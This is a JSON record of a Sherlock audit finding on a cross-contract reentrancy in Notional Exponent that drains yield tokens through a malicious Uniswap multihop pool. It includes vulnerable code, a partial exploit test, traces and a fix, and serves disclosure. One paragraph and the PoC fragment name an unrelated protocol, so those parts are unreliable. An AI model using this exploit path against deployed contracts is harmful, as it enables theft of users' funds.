{
    "id": 62482,
    "kind": "GIT",
    "auditfirm_id": 3,
    "impact": "HIGH",
    "finders_count": 4,
    "protocol_id": 3104,
    "title": "H-1: Cross-contract reentrancy allows YIELD_TOKEN theft for the `GenericERC4626` `WithdrawalRequestManager` variant",
    "content": "\nSource: https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/73 \n\n## Found by \n0xBoraichoT, KungFuPanda, Ragnarok, talfao\n\n- https://github.com/notional-finance/leveraged-vaults/blob/7e0abc3e118db0abb20c7521c6f53f1762fdf562/contracts/trading/adapters/UniV3Adapter.sol#L60-L72\n\n\n^ The only validations in-place are the tokenIn and tokenOut sanitizations, but not the whole multihop path though.\n\n<img width=\"815\" height=\"481\" alt=\"Image\" src=\"https://sherlock-files.ams3.digitaloceanspaces.com/gh-images/b8f9b6b7-8401-4160-aa5a-c678f49bb7f7\" />\n\n_NOTE_ This is the Trading module we have: https://etherscan.io/address/0x179a2d2408bfbc21b72d59c4a74e5010f07dc823#code\n\n![Image](https://sherlock-files.ams3.digitaloceanspaces.com/gh-images/b2d7e6ee-c3ab-44b9-bb85-1986f4418d07)\n\nhttps://etherscan.io/address/0xE592427A0AEce92De3Edee1F18E0157C05861564#code <-- UniswapV3 router\n\n## Description\nSince the `WithdrawalRequestManager` allows `onlyVault` operations for multiple different strategy \"vaults\",..\n\nA combination of a default reentrancy + cross-contract reentrancy is possible...\n\n...Through which `YIELD_TOKEN`s can be drained from the `WithdrawalRequestManager`...\n\n...---> to the yield strategy where the strategy's `depositAsset != WithdrawalRequestManager.STAKE_TOKEN`.\n\nThis way, the strategy will record a higher surplus (aka delta) of `YIELD_TOKEN`s in the current `YIELD_TOKEN.balanceOf(address(this))` and will mint more shares to the malicious user's account.\n\n\n\n`onlyApprovedVault` permits any caller whitelisted in the `isApprovedVault` mapping:\n```solidity\n    /// @dev Ensures that only approved vaults can initiate withdraw requests.\n    modifier onlyApprovedVault() {\n        if (!isApprovedVault[msg.sender]) revert Unauthorized(msg.sender);\n        _;\n    }\n```\n\nThus, it is possible to steal funds from the `WithdrawalRequestManager` and then burn these `YIELD_TOKEN`s in exchange for deposit underlying staking token assets.\n\n\n\n## Root cause\nA single `WithdrawalRequestManager` permits multiple `AbstractYieldStrategy` instances (aka \"whitelisted vaults\").\n\nSince neither the `WithdrawalRequestManager.stakeTokens` nor `WithdrawalRequestManager.initiateWithdraw` functions have a `nonReentrant` modifier or an equivalent cross-contract reentrancy protection method, the \n\n\n```solidity\n    function _initiateWithdraw(\n        address account,\n        uint256 yieldTokenAmount,\n        uint256 sharesHeld,\n        bytes memory data\n    ) internal override virtual returns (uint256 requestId) {\n        ERC20(yieldToken).approve(address(withdrawRequestManager), yieldTokenAmount);\n        requestId = withdrawRequestManager.initiateWithdraw({ // audit: reentrancy here!!!!\n            account: account, yieldTokenAmount: yieldTokenAmount, sharesAmount: sharesHeld, data: data\n        });\n    } // audit: does this affect the yield token balance somehow?\n\n    /// @dev By default we can use the withdraw request manager to stake the tokens\n    function _mintYieldTokens(uint256 assets, address /* receiver */, bytes memory depositData) internal override virtual { // audit: can it be reentered to increase the yieldtoken balance somehow???\n        ERC20(asset).approve(address(withdrawRequestManager), assets); // audit: reverts for USDT\n        withdrawRequestManager.stakeTokens(address(asset), assets, depositData); // audit malicious data\n    }\n```\n\n\n```solidity\n\n    /// @inheritdoc IWithdrawRequestManager\n    function stakeTokens(\n        address depositToken,\n        uint256 amount,\n        bytes calldata data // audit\n    ) external override onlyApprovedVault returns (uint256 yieldTokensMinted) { // @audit: should actually be non reentrant I think\n        uint256 initialYieldTokenBalance = ERC20(YIELD_TOKEN).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        (uint256 stakeTokenAmount, bytes memory stakeData) = _preStakingTrade(depositToken, amount, data); // audit: reenter and call initiateWithdraw from a diffferent vault (i.e., cross-contract reentrancy)\n        _stakeTokens(stakeTokenAmount, stakeData);\n\n\n\n        yieldTokensMinted = ERC20(YIELD_TOKEN).balanceOf(address(this)) - initialYieldTokenBalance; // audit: REENTRANCY HERE??? ðŸª»ðŸª»ðŸª»\n        ERC20(YIELD_TOKEN).safeTransfer(msg.sender, yieldTokensMinted);\n    }\n    \n\n    /// @inheritdoc IWithdrawRequestManager\n    function initiateWithdraw(\n        address account,\n        uint256 yieldTokenAmount,\n        uint256 sharesAmount,\n        bytes calldata data\n    ) external override onlyApprovedVault returns (uint256 requestId) {\n        WithdrawRequest storage accountWithdraw = s_accountWithdrawRequest[msg.sender][account];\n        if (accountWithdraw.requestId != 0) revert ExistingWithdrawRequest(msg.sender, account, accountWithdraw.requestId);\n\n        // Receive the requested amount of yield tokens from the approved vault.\n        ERC20(YIELD_TOKEN).safeTransferFrom(msg.sender, address(this), yieldTokenAmount); // audit: exchanging yieldtoken for the underlying assets\n\n        requestId = _initiateWithdrawImpl(account, yieldTokenAmount, data); // audit: reentrancy here??? through forceWithdraw(...)???\n        accountWithdraw.requestId = requestId;\n        accountWithdraw.yieldTokenAmount = yieldTokenAmount.toUint120();\n        accountWithdraw.sharesAmount = sharesAmount.toUint120();\n        s_tokenizedWithdrawRequest[requestId] = TokenizedWithdrawRequest({\n            totalYieldTokenAmount: yieldTokenAmount.toUint120(), // audit: may be outdated\n            totalWithdraw: 0,\n            finalized: false\n        });\n\n        emit InitiateWithdrawRequest(account, msg.sender, yieldTokenAmount, sharesAmount, requestId);\n    }\n\n```\n\n```solidity\n/ @dev Used for ERC4626s that can be staked and unstaked on demand without any additional\n/// time constraints.\ncontract GenericERC4626WithdrawRequestManager is AbstractWithdrawRequestManager {\n\n    uint256 private currentRequestId;\n    mapping(uint256 => uint256) private s_withdrawRequestShares;\n\n    constructor(address _erc4626)\n        AbstractWithdrawRequestManager(IERC4626(_erc4626).asset(), _erc4626, IERC4626(_erc4626).asset()) { }\n\n    function _initiateWithdrawImpl(\n        address /* account */,\n        uint256 sharesToWithdraw,\n        bytes calldata /* data */\n    ) override internal returns (uint256 requestId) {\n        requestId = ++currentRequestId;\n        s_withdrawRequestShares[requestId] = sharesToWithdraw;\n    }\n\n    function _stakeTokens(uint256 amount, bytes memory /* stakeData */) internal override {\n        ERC20(STAKING_TOKEN).approve(address(YIELD_TOKEN), amount);\n        IERC4626(YIELD_TOKEN).deposit(amount, address(this));\n    }\n\n    function _finalizeWithdrawImpl(\n        address /* account */,\n        uint256 requestId\n    ) internal override returns (uint256 tokensClaimed, bool finalized) {\n        uint256 sharesToRedeem = s_withdrawRequestShares[requestId];\n        delete s_withdrawRequestShares[requestId];\n        tokensClaimed = IERC4626(YIELD_TOKEN).redeem(sharesToRedeem, address(this), address(this));\n        finalized = true;\n        // audit: increases the yieldtoken balance\n    }\n\n    function canFinalizeWithdrawRequest(uint256 /* requestId */) public pure override returns (bool) {\n        return true;\n    }\n}\n```\n\n## Attack path\n\nWhen the `WithdrawalRequestManager` is using the `GenericERC4626` functionality variant:..\n\n```solidity\n/ @dev Used for ERC4626s that can be staked and unstaked on demand without any additional\n/// time constraints.\ncontract GenericERC4626WithdrawRequestManager is AbstractWithdrawRequestManager {\n\n    uint256 private currentRequestId;\n    mapping(uint256 => uint256) private s_withdrawRequestShares;\n\n    constructor(address _erc4626)\n        AbstractWithdrawRequestManager(IERC4626(_erc4626).asset(), _erc4626, IERC4626(_erc4626).asset()) { }\n\n    function _initiateWithdrawImpl(\n        address /* account */,\n        uint256 sharesToWithdraw,\n        bytes calldata /* data */\n    ) override internal returns (uint256 requestId) {\n        requestId = ++currentRequestId;\n        s_withdrawRequestShares[requestId] = sharesToWithdraw;\n    }\n\n    function _stakeTokens(uint256 amount, bytes memory /* stakeData */) internal override {\n        ERC20(STAKING_TOKEN).approve(address(YIELD_TOKEN), amount);\n        IERC4626(YIELD_TOKEN).deposit(amount, address(this));\n    }\n\n    function _finalizeWithdrawImpl(\n        address /* account */,\n        uint256 requestId\n    ) internal override returns (uint256 tokensClaimed, bool finalized) {\n        uint256 sharesToRedeem = s_withdrawRequestShares[requestId];\n        delete s_withdrawRequestShares[requestId];\n        tokensClaimed = IERC4626(YIELD_TOKEN).redeem(sharesToRedeem, address(this), address(this));\n        finalized = true;\n        // audit: increases the yieldtoken balance\n    }\n\n    function canFinalizeWithdrawRequest(uint256 /* requestId */) public pure override returns (bool) {\n        return true;\n    }\n}\n```\n\n... The users who request redemptions (via `initiateWithdraw`) just temporarily leave sparse `YIELD_TOKEN`s in the `WithdrawalRequestManager`.\n\n**It is a crucial observation needed for proving the validity of the suggested cross-contract reentrancy attack.**\n\n## External preconditions\n**Spare `YIELD_TOKEN`s in the `WithdrawalRequestManager`'s `GenericERC4626` variant as a result of other users calling `initateWithdraw` and leaving pending redemption requests.**\n\n_NOTE_ **Either through front-running or just proper timing, the attack will be executed before the requester calls `finalizeAndRedeemWithdrawRequest` or `finalizeRequestManual` is called.**\n\n\n1.\n```solidity\n        /// @inheritdoc ILendingRouter\n    function enterPosition(\n        address onBehalf,\n        address vault,\n        uint256 depositAssetAmount,\n        uint256 borrowAmount,\n        bytes calldata depositData\n    ) public override isAuthorized(onBehalf, vault) {\n        _enterPosition(onBehalf, vault, depositAssetAmount, borrowAmount, depositData, address(0));\n    }\n\n    function _enterPosition(\n        address onBehalf,\n        address vault,\n        uint256 depositAssetAmount,\n        uint256 borrowAmount,\n        bytes memory depositData,\n        address migrateFrom\n    ) internal {\n        address asset = IYieldStrategy(vault).asset();\n        // Cannot enter a position if the account already has a native share balance\n        if (IYieldStrategy(vault).balanceOf(onBehalf) > 0) revert CannotEnterPosition();\n\n        if (depositAssetAmount > 0) {\n            // Take any margin deposit from the sender initially\n            ERC20(asset).safeTransferFrom(msg.sender, address(this), depositAssetAmount);\n        }\n\n        if (borrowAmount > 0) {\n            _flashBorrowAndEnter(\n                onBehalf, vault, asset, depositAssetAmount, borrowAmount, depositData, migrateFrom\n            );\n        } else {\n            _enterOrMigrate(onBehalf, vault, asset, depositAssetAmount, depositData, migrateFrom);\n        }\n\n        ADDRESS_REGISTRY.setPosition(onBehalf, vault); // audit: the vault can be completely permissionless\n    }\n\n    /// @dev Enters a position or migrates shares from a previous lending router\n    function _enterOrMigrate(\n        address onBehalf,\n        address vault,\n        address asset,\n        uint256 assetAmount,\n        bytes memory depositData,\n        address migrateFrom\n    ) internal returns (uint256 sharesReceived) {\n        if (migrateFrom != address(0)) {\n            // Allow the previous lending router to repay the debt from assets held here.\n            ERC20(asset).checkApprove(migrateFrom, assetAmount);\n            sharesReceived = ILendingRouter(migrateFrom).balanceOfCollateral(onBehalf, vault);\n\n            // Must migrate the entire position\n            ILendingRouter(migrateFrom).exitPosition(\n                onBehalf, vault, address(this), sharesReceived, type(uint256).max, bytes(\"\")\n            );\n        } else {\n            ERC20(asset).approve(vault, assetAmount);\n            sharesReceived = IYieldStrategy(vault).mintShares(assetAmount, onBehalf, depositData); // @audit:reentrant\n        }\n\n        _supplyCollateral(onBehalf, vault, asset, sharesReceived);\n    }\n```\n\n\n2. \n```solidity\n     function mintShares(\n        uint256 assetAmount,\n        address receiver,\n        bytes calldata depositData\n    ) external override onlyLendingRouter setCurrentAccount(receiver) nonReentrant returns (uint256 sharesMinted) {\n        // Cannot mint shares if the receiver has an active withdraw request\n        if (_isWithdrawRequestPending(receiver)) revert CannotEnterPosition();\n        ERC20(asset).safeTransferFrom(t_CurrentLendingRouter, address(this), assetAmount);\n        sharesMinted = _mintSharesGivenAssets(assetAmount, depositData, receiver); // audit: unsanitized depositData\n\n        t_AllowTransfer_To = t_CurrentLendingRouter;\n        t_AllowTransfer_Amount = sharesMinted;\n        // Transfer the shares to the lending router so it can supply collateral\n        _transfer(receiver, t_CurrentLendingRouter, sharesMinted);\n    }\n\n    /// @dev Marked as virtual to allow for RewardManagerMixin to override\n    function _mintSharesGivenAssets(uint256 assets, bytes memory depositData, address receiver) internal virtual returns (uint256 sharesMinted) { // audit\n        if (assets == 0) return 0;\n\n        // First accrue fees on the yield token\n        _accrueFees();\n        uint256 initialYieldTokenBalance = _yieldTokenBalance();\n        _mintYieldTokens(assets, receiver, depositData); // audit\n        uint256 yieldTokensMinted = _yieldTokenBalance() - initialYieldTokenBalance; // audit: can this be manipulated through reentrancy somehow???\n\n        sharesMinted = (yieldTokensMinted * effectiveSupply()) / (initialYieldTokenBalance - feesAccrued() + VIRTUAL_YIELD_TOKENS); // audit: effectiveSupply can be manipulated to become greater than intended\n        _mint(receiver, sharesMinted); // audit: reentrant\n    }\n```\n3.\n```solidity\n     /// @dev By default we can use the withdraw request manager to stake the tokens\n    function _mintYieldTokens(uint256 assets, address /* receiver */, bytes memory depositData) internal override virtual { // audit: can it be reentered to increase the yieldtoken balance somehow???\n        ERC20(asset).approve(address(withdrawRequestManager), assets); // audit: reverts for USDT\n        withdrawRequestManager.stakeTokens(address(asset), assets, depositData); // audit malicious data\n    }\n```\n4.\n```solidity\n    function _initiateWithdraw(\n        address account,\n        uint256 yieldTokenAmount,\n        uint256 sharesHeld,\n        bytes memory data\n    ) internal override virtual returns (uint256 requestId) {\n        ERC20(yieldToken).approve(address(withdrawRequestManager), yieldTokenAmount);\n        requestId = withdrawRequestManager.initiateWithdraw({ // audit: reentrancy here!!!!\n            account: account, yieldTokenAmount: yieldTokenAmount, sharesAmount: sharesHeld, data: data\n        });\n    } // audit: does this affect the yield token balance somehow?\n```\n\n\n_NOTE_ The Uniswap multihop trade data should include a malicious swap middle pool to make the reentrancy callback itself even possible.\n\nYou can see the e2e PoC at the end of this report.\n\n\n## Internal preconditions\nNone.\n\n\n## Impact\nTheft of other users' funds via stealing `YIELD_TOKEN`s from the pending ERC4626-variant `WithdrawalRequestManager` requests of other users.\n```solidity\n    /// @inheritdoc IYieldStrategy\n    function initiateWithdraw(\n        address account,\n        uint256 sharesHeld,\n        bytes calldata data\n    ) external onlyLendingRouter setCurrentAccount(account) override returns (uint256 requestId) {\n        requestId = _withdraw(account, sharesHeld, data); // audit: lacks nonreentrant modifier\n    }\n\n    /// @inheritdoc IYieldStrategy\n    /// @dev We do not set the current account here because valuation is not done in this method. A\n    /// native balance does not require a collateral check.\n    function initiateWithdrawNative(\n        bytes memory data // audit: lscks nonReentrant, so can reenter exactly here\n    ) external override returns (uint256 requestId) { // audit: lacks the nonReentrant modifier\n        requestId = _withdraw(msg.sender, balanceOf(msg.sender), data); // audit: unsanitized data\n    }\n\n    function _withdraw(address account, uint256 sharesHeld, bytes memory data) internal returns (uint256 requestId) {\n        if (sharesHeld == 0) revert InsufficientSharesHeld();\n\n        // Accrue fees before initiating a withdraw since it will change the effective supply\n        _accrueFees();\n        uint256 yieldTokenAmount = convertSharesToYieldToken(sharesHeld);\n        requestId = _initiateWithdraw(account, yieldTokenAmount, sharesHeld, data);\n        // Escrow the shares after the withdraw since it will change the effective supply\n        // during reward claims when using the RewardManagerMixin.\n        s_escrowedShares += sharesHeld;\n\n    }\n```\n\n\n```solidity\n\n    /// @inheritdoc IWithdrawRequestManager\n    function setApprovedVault(address vault, bool isApproved) external override onlyOwner {\n        isApprovedVault[vault] = isApproved;\n        emit ApprovedVault(vault, isApproved);\n    }\n\n    /// @inheritdoc IWithdrawRequestManager\n    function stakeTokens(\n        address depositToken,\n        uint256 amount,\n        bytes calldata data // audit\n    ) external override onlyApprovedVault returns (uint256 yieldTokensMinted) { // @audit: should actually be non reentrant I think\n        uint256 initialYieldTokenBalance = ERC20(YIELD_TOKEN).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        (uint256 stakeTokenAmount, bytes memory stakeData) = _preStakingTrade(depositToken, amount, data); // audit: reenter and call initiateWithdraw from a diffferent vault (i.e., cross-contract reentrancy)\n        _stakeTokens(stakeTokenAmount, stakeData);\n\n\n\n        yieldTokensMinted = ERC20(YIELD_TOKEN).balanceOf(address(this)) - initialYieldTokenBalance; // audit: non-reliable due to reentrancy\n        ERC20(YIELD_TOKEN).safeTransfer(msg.sender, yieldTokensMinted);\n    }\n    \n\n    /// @inheritdoc IWithdrawRequestManager\n    function initiateWithdraw(\n        address account,\n        uint256 yieldTokenAmount,\n        uint256 sharesAmount,\n        bytes calldata data\n    ) external override onlyApprovedVault returns (uint256 requestId) {\n        WithdrawRequest storage accountWithdraw = s_accountWithdrawRequest[msg.sender][account];\n        if (accountWithdraw.requestId != 0) revert ExistingWithdrawRequest(msg.sender, account, accountWithdraw.requestId);\n\n        // Receive the requested amount of yield tokens from the approved vault.\n        ERC20(YIELD_TOKEN).safeTransferFrom(msg.sender, address(this), yieldTokenAmount); // audit: exchanging yieldtoken for the underlying assets\n\n        requestId = _initiateWithdrawImpl(account, yieldTokenAmount, data); // audit: reentrancy here??? through forceWithdraw(...)???\n        accountWithdraw.requestId = requestId;\n        accountWithdraw.yieldTokenAmount = yieldTokenAmount.toUint120();\n        accountWithdraw.sharesAmount = sharesAmount.toUint120();\n        s_tokenizedWithdrawRequest[requestId] = TokenizedWithdrawRequest({\n            totalYieldTokenAmount: yieldTokenAmount.toUint120(), // audit: may be outdated\n            totalWithdraw: 0,\n            finalized: false\n        });\n\n        emit InitiateWithdrawRequest(account, msg.sender, yieldTokenAmount, sharesAmount, requestId);\n    }\n```\n\nThe only swap path validations are ensuring the first and last tokens match expected values (tokenIn and deUSD in correct order) and a minimum length. This allows an attacker to insert their own malicious token and pool addresses mid-path. During the Uniswap swap, when execution reaches the attacker-controlled pool, the attackerâ€™s token contract can execute arbitrary code in its transfer function. By coding this hook to reenter the Jigsaw protocolâ€”specifically, calling HoldingManager.depositâ€”the attacker can deposit some new tokens before the swap completes.\n\n```solidity\n    function _exactInBatch(address from, Trade memory trade) private pure returns (bytes memory) {\n        UniV3BatchData memory data = abi.decode(trade.exchangeData, (UniV3BatchData));\n\n        // Validate path EXACT_IN = [sellToken, fee, ... buyToken]\n        require(32 <= data.path.length);\n        require(_toAddress(data.path, 0) == _getTokenAddress(trade.sellToken));\n        require(_toAddress(data.path, data.path.length - 20) == _getTokenAddress(trade.buyToken));\n\n        ISwapRouter.ExactInputParams memory params = ISwapRouter.ExactInputParams(\n            data.path, from, trade.deadline, trade.amount, trade.limit\n        );\n\n        return abi.encodeWithSelector(ISwapRouter.exactInput.selector, params);\n    }\n```\n\n```solidity\n    function _getExecutionData(\n        uint16 dexId,\n        address from,\n        Trade memory trade\n    )\n        internal\n        pure\n        returns (\n            address spender,\n            address target,\n            uint256 msgValue,\n            bytes memory executionCallData\n        )\n    {\n        if (trade.buyToken == trade.sellToken) revert SellTokenEqualsBuyToken();\n\n        if (DexId(dexId) == DexId.UNISWAP_V3) {\n            return UniV3Adapter.getExecutionData(from, trade);\n        } else if (DexId(dexId) == DexId.BALANCER_V2) {\n```\n\n\n```solidity\n\n    /// @dev Initiates a withdraw request for the vault shares held by the account\n    function _initiateWithdraw(\n        address vault,\n        address account,\n        bytes calldata data\n    ) internal returns (uint256 requestId) {\n        uint256 sharesHeld = balanceOfCollateral(account, vault);\n        if (sharesHeld == 0) revert InsufficientSharesHeld();\n        return IYieldStrategy(vault).initiateWithdraw(account, sharesHeld, data); // audit\n    }\n```\n\n## PoC\n\nTo run the real coded PoC you need to first modify the `AbstractStakingStrategy` and the `MorphoLendingRouter` contracts in such a way that all direct `asset.approve(...)` are replaced with either the custom safe `.checkApprove` or `.safeApprove` or `.forceApprove`.\n\nIn other words, you just need to fix this another USDT incompatibility error first.\n\n```solidity\n            p.createPoolAndMint(PoolCreator.CreateArgs({\n                tokenA: IERC20(tokenIn),\n                tokenAAmount: 1e6,\n                tokenB: fakeToken,\n                tokenBAmount: 1000e18,\n                fee: poolFee,\n                factory: IUniswapV3Factory(IPeripheryImmutableState(uniswapRouter).factory())\n            }));\n            vm.stopPrank();\n        }\n\n        HackCode code = new HackCode(manager, IERC20(tokenIn));\n\n        // Since the holder's user cannot be a contract, the attacker has to resort to\n        // https://eips.ethereum.org/EIPS/eip-7702 .\n        // They can set a pointer in their EOA pointing to the code.\n        // Since this EIP is not yet supported in Foundry, we'll emulate it with vm.etch:\n        deal(tokenIn, user, 100e6, true);\n        vm.etch(user, address(code).code);\n        fakeToken.callme(user);\n\n        bytes memory dataClaimInvest = abi.encode(\n            amount * 99 / 100, // amountOutMinimum\n            uint256(block.timestamp), // deadline\n            abi.encodePacked(deUSD, poolFee, USDC, poolFee, tokenIn,\n                // note how the control is temporary transferred to the attacker's token:\n                poolFee, fakeToken, poolFee, tokenIn)\n        );\n```\n\n\nYou can see more tokens are minted that intended:\n\nWith the attack:\n```bash\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â† [Return] 50292400900908 [5.029e13]\n    â”‚   â”‚   â”‚   â”œâ”€ [23036] ERC4626Mock::transfer(StakingStrategy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 50092400904714 [5.009e13])\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€ emit Transfer(from: GenericERC4626WithdrawRequestManager: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: StakingStrategy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 50092400904714 [5.009e13])\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€  storage changes:\n    â”‚   â”‚   â”‚   â”‚   â”‚   @ 0xb3024e141922907eb80bf787d622b0c592108908135c35e38e6ebb7d5636f1e4: 0x00000000000000000000000000000000000000000000000000002dbd9cb0cb2c â†’ 0x0000000000000000000000000000000000000000000000000000002e90edc122\n    â”‚   â”‚   â”‚   â”‚   â”‚   @ 0x8e945654193bec28956c368b451931aae1dd2f910b3127995a9fc7169f7ea4d1: 0 â†’ 0x00000000000000000000000000000000000000000000000000002d8f0bc30a0a\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â† [Return] true\n    â”‚   â”‚   â”‚   â”œâ”€ emit DeltaYieldToken(_delta: 50092400904714 [5.009e13])\n```\n\n\nWithout the attack enabled:\n```bash\n    â”‚   â”‚   â”‚   â”œâ”€ [548] ERC4626Mock::balanceOf(GenericERC4626WithdrawRequestManager: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â† [Return] 50192400902810 [5.019e13]\n    â”‚   â”‚   â”‚   â”œâ”€ [23036] ERC4626Mock::transfer(StakingStrategy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 49992400906616 [4.999e13])\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€ emit Transfer(from: GenericERC4626WithdrawRequestManager: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: StakingStrategy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 49992400906616 [4.999e13])\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€  storage changes:\n    â”‚   â”‚   â”‚   â”‚   â”‚   @ 0xb3024e141922907eb80bf787d622b0c592108908135c35e38e6ebb7d5636f1e4: 0x00000000000000000000000000000000000000000000000000002da65439ea9a â†’ 0x0000000000000000000000000000000000000000000000000000002e90edc122\n    â”‚   â”‚   â”‚   â”‚   â”‚   @ 0x8e945654193bec28956c368b451931aae1dd2f910b3127995a9fc7169f7ea4d1: 0 â†’ 0x00000000000000000000000000000000000000000000000000002d77c34c2978\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â† [Return] true\n    â”‚   â”‚   â”‚   â”œâ”€ emit DeltaYieldToken(_delta: 49992400906616 [4.999e13])\n```\n\n\nThe difference is **EXACTLY** the `99999998098` shares transferred during the reentrant swap callback via `initiateWithdraw` (i.e., `50092400904714-99999998098 = 4.99924009e13`.\n\nYou can see that more shares are minted than the deposit is really worth.\n\nThis can be maximized by targeting `forceWithdraw` to make an artificially earned delta even greater!\n\n### See my Gist PoC here:\n\nhttps://gist.github.com/c-plus-plus-equals-c-plus-one/500a3df82f34eb894db54a4e619fcfed\n\n## Mitigation\nThe \"before balance\" state accounting hould be captured **after** the `_preStakingTrade` call:\n```diff\n    /// @inheritdoc IWithdrawRequestManager\n    function stakeTokens(\n        address depositToken,\n        uint256 amount,\n        bytes calldata data // audit\n    ) external override onlyApprovedVault returns (uint256 yieldTokensMinted) { // @audit: should actually be non reentrant I think\n-       uint256 initialYieldTokenBalance = ERC20(YIELD_TOKEN).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        (uint256 stakeTokenAmount, bytes memory stakeData) = _preStakingTrade(depositToken, amount, data); // audit: reenter and call initiateWithdraw from a diffferent vault (i.e., cross-contract reentrancy)\n+       uint256 initialYieldTokenBalance = ERC20(YIELD_TOKEN).balanceOf(address(this));\n        _stakeTokens(stakeTokenAmount, stakeData);\n\n\n\n        yieldTokensMinted = ERC20(YIELD_TOKEN).balanceOf(address(this)) - initialYieldTokenBalance; // audit: REENTRANCY HERE??? ðŸª»ðŸª»ðŸª»\n        ERC20(YIELD_TOKEN).safeTransfer(msg.sender, yieldTokensMinted);\n    }\n    \n```\n\n",
    "summary": "\nThis bug report describes a vulnerability found in a smart contract code. The code is used for trading and allows users to withdraw their funds. The bug allows a malicious user to steal funds from the contract by using a combination of reentrancy and cross-contract reentrancy. This can be done by draining yield tokens from the contract and then burning them in exchange for deposit underlying staking token assets. The vulnerability is caused by the lack of proper validation and protection against reentrancy in the code. This can be exploited by a user who has spare yield tokens in the contract. The attack can be executed by front-running or proper timing before the user calls a specific function. The bug was found by a group of users and reported on GitHub. ",
    "report_date": "2025-07-18T15:00:00.000Z",
    "contest_prize_txt": "75500 USDC",
    "contest_link": "https://app.sherlock.xyz/audits/contests/1001",
    "sponsor_name": "",
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "",
    "github_link": "https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/73",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "1001",
    "slug": "h-1-cross-contract-reentrancy-allows-yield_token-theft-for-the-genericerc4626-withdrawalrequestmanager-variant-sherlock-notional-exponent-git",
    "firm_name": "Sherlock",
    "firm_logo_square": "sherlock_square.png",
    "protocol_name": "Notional Exponent",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "talfao"
            }
        },
        {
            "wardens_warden": {
                "handle": "KungFuPa"
            }
        },
        {
            "wardens_warden": {
                "handle": "0xBoraichoT"
            }
        },
        {
            "wardens_warden": {
                "handle": "Ragnarok"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
    },
    "protocols_protocol": {
        "name": "Notional Exponent",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}